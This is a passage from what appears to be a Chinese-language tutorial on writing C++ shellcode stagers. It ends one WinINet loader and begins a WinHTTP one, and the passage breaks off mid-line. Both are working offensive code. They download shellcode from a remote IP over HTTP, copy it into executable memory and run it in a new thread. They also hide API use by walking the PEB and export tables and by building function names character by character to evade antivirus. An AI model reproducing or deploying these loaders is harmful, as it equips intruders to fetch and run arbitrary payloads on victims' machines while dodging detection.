MyInternetOpenA pInternetOpenA = (MyInternetOpenA)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(wininet), internetOpenA);<br>    MyInternetConnectA pInternetConnectA = (MyInternetConnectA)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(wininet), internetConnectA);<br>    MyHttpOpenRequestA pHttpOpenRequestA = (MyHttpOpenRequestA)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(wininet), httpOpenRequestA);<br>    MyHttpSendRequestA pHttpSendRequestA = (MyHttpSendRequestA)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(wininet), httpSendRequestA);<br>    MyInternetReadFile pInternetReadFile = (MyInternetReadFile)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(wininet), internetReadFile);<br>    MyInternetCloseHandle pInternetCloseHandle = (MyInternetCloseHandle)<span class="hljs-built_in">pGetProcAddress</span>(<span class="hljs-built_in">pLoadLibraryA</span>(wininet), internetCloseHandle);<br><br>    <span class="hljs-comment">// 初始化Internet会话</span><br>    HINTERNET hInternet = <span class="hljs-built_in">pInternetOpenA</span>(UA, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 连接到HTTP服务器</span><br>    HINTERNET hConnect = <span class="hljs-built_in">pInternetConnectA</span>(hInternet, IP, <span class="hljs-number">8080</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 创建HTTP请求</span><br>    HINTERNET hRequest = <span class="hljs-built_in">pHttpOpenRequestA</span>(hConnect, Method, PATH, Version, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 发送HTTP请求</span><br>    <span class="hljs-built_in">pHttpSendRequestA</span>(hRequest, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 先分配一个较大的缓冲区来接收数据（支持更大的shellcode）</span><br>    <span class="hljs-type">const</span> DWORD MAX_SHELLCODE_SIZE = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 1MB 缓冲区</span><br>    LPVOID lpbuffer = <span class="hljs-built_in">pVirtualAlloc</span>(<span class="hljs-literal">NULL</span>, MAX_SHELLCODE_SIZE, MEM_COMMIT, PAGE_READWRITE);<br><br>    <span class="hljs-comment">// 读取数据</span><br>    DWORD dwTotalRead = <span class="hljs-number">0</span>;<br>    DWORD dwBytesRead = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 循环读取数据，直到读取完所有数据</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">pInternetReadFile</span>(hRequest, (LPBYTE)lpbuffer + dwTotalRead, MAX_SHELLCODE_SIZE - dwTotalRead, &amp;dwBytesRead)) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        dwTotalRead += dwBytesRead;<br>    &#125; <span class="hljs-keyword">while</span> (dwBytesRead &gt; <span class="hljs-number">0</span> &amp;&amp; dwTotalRead &lt; MAX_SHELLCODE_SIZE);<br><br>    <span class="hljs-comment">// 清理网络资源</span><br>    <span class="hljs-keyword">if</span> (hRequest) <span class="hljs-built_in">pInternetCloseHandle</span>(hRequest);<br>    <span class="hljs-keyword">if</span> (hConnect) <span class="hljs-built_in">pInternetCloseHandle</span>(hConnect);<br>    <span class="hljs-keyword">if</span> (hInternet) <span class="hljs-built_in">pInternetCloseHandle</span>(hInternet);<br><br>    <span class="hljs-comment">// 申请一块可执行的内存区域，大小为实际读取的数据大小</span><br>    LPVOID pExecutableMemory = <span class="hljs-built_in">pVirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwTotalRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-comment">// 将下载的数据复制到可执行内存区域</span><br>    <span class="hljs-built_in">pRtlMoveMemory</span>(pExecutableMemory, lpbuffer, dwTotalRead);<br><br>    <span class="hljs-comment">// 释放原始缓冲区</span><br>    <span class="hljs-built_in">pVirtualAlloc</span>(lpbuffer, <span class="hljs-number">0</span>, MEM_RELEASE, <span class="hljs-number">0</span>);<br><br><br>    <span class="hljs-comment">// 创建一个线程执行内存中的shellcode</span><br>    HANDLE hThread = <span class="hljs-built_in">pCreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pExecutableMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hThread) &#123;<br>        <span class="hljs-comment">// 等待线程执行完成</span><br>        <span class="hljs-built_in">pWaitForSingleObject</span>(hThread, INFINITE);<br>        <span class="hljs-comment">// 关闭线程句柄</span><br>        <span class="hljs-built_in">pCloseHandle</span>(hThread);<br>    &#125;<br><br>    <span class="hljs-comment">// 释放可执行内存</span><br>    <span class="hljs-built_in">pVirtualAlloc</span>(pExecutableMemory, <span class="hljs-number">0</span>, MEM_RELEASE, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2025/png/34580676/1760354516033-20dab95e-3a3e-442c-83cc-591c7024543c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="5-2-cpp-实现远程-shellcode（winhttp）"><a href="#5-2-cpp-实现远程-shellcode（winhttp）" class="headerlink" title="5.2 cpp 实现远程 shellcode（winhttp）"></a>5.2 cpp 实现远程 shellcode（winhttp）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// winhttp4stager.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Winhttp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-comment">// 自定义宽字符转小写（简化版 Unicode 支持）</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span> <span class="hljs-title">my_towlower</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> c)</span> </span>&#123;<br>    <span class="hljs-comment">// 基础拉丁字母（A-Z）直接转换</span><br>    <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">L&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="hljs-string">L&#x27;Z&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> c + <span class="hljs-number">32</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c;<br>&#125;<br><br><span class="hljs-comment">// 不区分大小写的宽字符串比较函数（不修改原始字符串）</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringW</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str1, <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* str2)</span> </span>&#123;<br>    <span class="hljs-comment">// 空指针检查</span><br>    <span class="hljs-keyword">if</span> (str1 == <span class="hljs-literal">NULL</span> || str2 == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 动态转换并比较字符，无需修改原始字符串</span><br>    <span class="hljs-keyword">while</span> (str1[i] != <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] != <span class="hljs-string">L&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-type">wchar_t</span> c1 = <span class="hljs-built_in">my_towlower</span>(str1[i]);<br>        <span class="hljs-type">wchar_t</span> c2 = <span class="hljs-built_in">my_towlower</span>(str2[i]);<br><br>        <span class="hljs-keyword">if</span> (c1 != c2) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">L&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">L&#x27;\0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// ASCII字符串比较函数</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">MyCompareStringA</span><span class="hljs-params">(CHAR str1[], CHAR str2[])</span> </span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (str1[i] &amp;&amp; str2[i]) &#123;<br>        <span class="hljs-keyword">if</span> (str1[i] != str2[i]) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 必须同时到达字符串结尾才算相等</span><br>    <span class="hljs-keyword">return</span> (str1[i] == <span class="hljs-string">&#x27;\0&#x27;</span> &amp;&amp; str2[i] == <span class="hljs-string">&#x27;\0&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 提取 DLL 名称的函数</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span>* <span class="hljs-title">ExtractDllName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* fullDllName)</span> </span>&#123;<br>    <span class="hljs-type">wchar_t</span>* fileName = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">wchar_t</span>* temp = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br><br>    <span class="hljs-comment">// 遍历并找到最后一个 &#x27;\\&#x27;，获取文件名部分</span><br>    <span class="hljs-keyword">while</span> (*temp) &#123;<br>        <span class="hljs-keyword">if</span> (*temp == <span class="hljs-string">L&#x27;\\&#x27;</span>) &#123;<br>            fileName = temp + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新文件名的位置</span><br>        &#125;<br>        temp++;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有找到 &#x27;\\&#x27;，则认为整个字符串就是文件名</span><br>    <span class="hljs-keyword">if</span> (!fileName) &#123;<br>        fileName = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> fileName;<br>&#125;<br><br><span class="hljs-function">FARPROC <span class="hljs-title">GetApiAddressByName</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* TargertDllName, <span class="hljs-type">char</span>* ApiName)</span> </span>&#123;<br>    <span class="hljs-comment">// 从获取 PEB 地址</span><br>    PPEB pPEB = (PPEB)__readgsqword(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-comment">// 获取 PEB.Ldr</span><br>    PPEB_LDR_DATA pLdr = pPEB-&gt;Ldr;<br><br>    <span class="hljs-comment">// 遍历模块列表</span><br>    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;<br>    PLIST_ENTRY pCurrentEntry = pListHead-&gt;Flink;<br>    <span class="hljs-keyword">while</span> (pCurrentEntry &amp;&amp; pCurrentEntry != pListHead) &#123;<br>        PLDR_DATA_TABLE_ENTRY pEntry = <span class="hljs-built_in">CONTAINING_RECORD</span>(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);<br><br>        <span class="hljs-keyword">if</span> (pEntry &amp;&amp; pEntry-&gt;FullDllName.Buffer) &#123;<br>            <span class="hljs-type">wchar_t</span>* fullDllPath = pEntry-&gt;FullDllName.Buffer;<br><br>            <span class="hljs-comment">// 提取 DLL 名称</span><br>            <span class="hljs-type">wchar_t</span>* CurrentDllName = <span class="hljs-built_in">ExtractDllName</span>(fullDllPath);<br><br>            <span class="hljs-comment">// 比较 DLL 名称（不区分大小写）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringW</span>(CurrentDllName, TargertDllName)) &#123;<br>                <span class="hljs-comment">// 找到目标 DLL</span><br>                HMODULE hModule = (HMODULE)pEntry-&gt;DllBase;<br><br>                <span class="hljs-comment">// 分析 PE 文件找到导出表</span><br>                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + ((PIMAGE_DOS_HEADER)hModule)-&gt;e_lfanew);<br>                PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +<br>                    pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><br>                <span class="hljs-comment">// 获取导出表的各个信息</span><br>                DWORD* pFunctionNames = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNames);<br>                DWORD* pFunctionAddresses = (DWORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfFunctions);<br>                WORD* pFunctionOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory-&gt;AddressOfNameOrdinals);<br><br>                <span class="hljs-comment">// 遍历导出表，查找目标函数</span><br>                <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123;<br>                    <span class="hljs-type">char</span>* functionName = (<span class="hljs-type">char</span>*)((BYTE*)hModule + pFunctionNames[i]);<br><br>                    <span class="hljs-comment">// 找到函数名，获取其地址</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">MyCompareStringA</span>(functionName, ApiName)) &#123;<br>                        <span class="hljs-keyword">return</span> (FARPROC)((BYTE*)hModule + pFunctionAddresses[pFunctionOrdinals[i]]);<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 如果遍历完导出表未找到函数，返回 NULL</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br><br>        pCurrentEntry = pCurrentEntry-&gt;Flink;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 未找到模块</span><br>&#125;<br><br>__declspec(<span class="hljs-built_in">code_seg</span>(<span class="hljs-string">&quot;.text$A&quot;</span>)) <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 1. 函数声明</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">FARPROC</span><span class="hljs-params">(WINAPI* MyGetProcAddress)</span><span class="hljs-params">(HMODULE hModule, LPCSTR  lpProcName)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HMODULE</span><span class="hljs-params">(WINAPI* MyLoadLibraryA)</span><span class="hljs-params">(LPCSTR lpLibFileName)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HINTERNET</span><span class="hljs-params">(WINAPI* MyWinHttpOpen)</span><span class="hljs-params">(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HINTERNET</span><span class="hljs-params">(WINAPI* MyWinHttpConnect)</span><span class="hljs-params">(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HINTERNET</span><span class="hljs-params">(WINAPI* MyWinHttpOpenRequest)</span><span class="hljs-params">(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyWinHttpSendRequest)</span><span class="hljs-params">(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyWinHttpReceiveResponse)</span><span class="hljs-params">(HINTERNET hRequest, LPVOID lpReserved)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyWinHttpReadData)</span><span class="hljs-params">(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyWinHttpCloseHandle)</span><span class="hljs-params">(HINTERNET hInternet)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">LPVOID</span><span class="hljs-params">(WINAPI* MyVirtualAlloc)</span><span class="hljs-params">(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(WINAPI* MySleep)</span><span class="hljs-params">(DWORD dwMilliseconds)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span><span class="hljs-params">(WINAPI* MyRtlMoveMemory)</span><span class="hljs-params">(PVOID Destination, PVOID Source, SIZE_T Length)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HANDLE</span><span class="hljs-params">(WINAPI* MyCreateThread)</span><span class="hljs-params">(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* MyWaitForSingleObject)</span><span class="hljs-params">(HANDLE hHandle, DWORD dwMilliseconds)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span><span class="hljs-params">(WINAPI* MyCloseHandle)</span><span class="hljs-params">(HANDLE hObject)</span></span>;<br><br>    <span class="hljs-comment">// 2. 需要用到的API和DLL的名称</span><br>    CHAR winHttpOpen[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR winHttpConnect[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR winHttpOpenRequest[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;O&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR winHttpSendRequest[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;q&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR winHttpReceiveResponse[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br>    CHAR winHttpReadData[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;H&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span 